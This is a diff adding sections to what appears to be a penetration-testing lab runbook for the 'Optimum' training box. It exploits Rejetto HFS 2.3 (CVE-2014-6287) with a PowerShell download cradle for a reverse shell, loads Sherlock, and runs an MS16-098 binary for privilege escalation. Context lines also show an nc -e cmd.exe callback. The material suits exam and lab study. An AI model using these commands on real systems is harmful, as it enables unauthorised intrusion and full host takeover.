@@ -1114,6 +1114,40 @@ ruby -c "$ExploitFile"
 ruby "$ExploitFile" "http://$BoxIP/"
 ```
 
+### Rejetto HttpFileServer 2.3 / CVE-2014-6287
+
+```bash
+# Fingerprint HFS and locate the matching public proof.
+sudo nmap -Pn -n -sC -sV -p "$WebPort" "$BoxIP" -oA "$BoxDir/nmap/services"
+
+curl -sS -i "http://$BoxIP:$WebPort/" | tee "$BoxDir/loot/http-root.txt"
+
+searchsploit "Rejetto HttpFileServer 2.3"
+
+searchsploit -x 49125
+
+cp /usr/share/exploitdb/exploits/windows/webapps/49125.py "$BoxDir/exploits/49125.py"
+
+python3 -m py_compile "$BoxDir/exploits/49125.py"
+```
+
+```bash
+# Serve a reviewed callback and start the listener before the trigger.
+python3 -m http.server "$TransferPort" --directory "$BoxDir/www"
+
+nc -lvnp "$CallbackPort"
+
+# The HFS PoC URL-encodes the command and places it in the search parameter.
+HfsCommand="powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://$LocalIP:$TransferPort/shell.ps1')\""
+
+python3 "$BoxDir/exploits/49125.py" "$BoxIP" "$WebPort" "$HfsCommand"
+```
+
+> [!warning] 💡 HFS gotcha
+> A successful HFS request does not prove a shell. Confirm the file-server access log, receive the callback, and run `whoami` before local enumeration. Keep the HFS port, transfer port, and callback port separate.
+
+See [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]], [[RUNBOOK V2/Windows - Exploit Search]], and [[COMMAND BREAKDOWNS/Web Applications (Breakdowns)|Web application breakdowns]].
+
 ```bash
 # Search by product and version
 searchsploit $Service $Version
@@ -1898,6 +1932,32 @@ $PotatoPath -l $PotatoPort -p $CmdPath \
   -a "/c $NcPath $LocalIP $Port2 -e cmd.exe" \
   -t * -c $CLSID
 ```
+
+### Old Windows patch triage: Sherlock and MS16-098
+
+```powershell
+# Capture the exact OS, architecture, patch list, and processor count first.
+systeminfo
+
+# Load Sherlock and invoke its function in the same PowerShell process.
+IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP:$TransferPort/Sherlock.ps1')
+
+Find-AllVulns
+```
+
+```powershell
+# Run the reviewed MS16-098 binary from the clean callback shell.
+(New-Object Net.WebClient).DownloadFile('http://$LocalIP:$TransferPort/bfill.exe', 'C:\Users\$Username\Desktop\bfill.exe')
+
+C:\Users\$Username\Desktop\bfill.exe cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\Users\$Username\Desktop\system-shell.ps1
+
+whoami
+```
+
+> [!warning] 💡 One-CPU gotcha
+> Sherlock can report MS16-032 as appearing vulnerable, but its exploit checks the processor count and exits on a single-CPU host. Read `systeminfo` before choosing that route. Optimum used MS16-098, CVE-2016-3309, from a clean native callback instead.
+
+See [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]] and [[COMMAND APPENDIX/Windows Privilege Escalation|Windows privilege escalation]].
 
 ### Windows escalation branches: policy, tokens, services and credentials
 
